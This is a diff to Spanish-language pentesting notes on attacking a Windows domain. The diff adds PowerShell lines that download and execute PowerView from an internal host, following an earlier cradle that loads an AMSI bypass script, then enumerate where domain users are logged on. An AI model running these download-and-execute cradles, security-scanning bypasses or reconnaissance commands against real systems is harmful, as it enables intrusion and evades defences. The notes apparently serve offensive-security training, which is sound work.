@@ -384,4 +384,12 @@ iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/sblog
 iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/Amsi-Byp.txt')
 ```
 
-Segundo ya una vez que hayamos ejecutado el bypas podremos cargar un PowerView
+Segundo ya una vez que hayamos ejecutado el bypass podremos cargar un PowerView
+```shell
+iex (New-Object System.NET.WebClient).DownloadString('http://172.16.100.97/PowerView.ps1')
+```
+
+Una vez cargado podemos usar herramientas de este en este caso enumeraremos los usuarios conectados a los equipos de dominio
+```shell
+Find-DomainUserLocation
+```
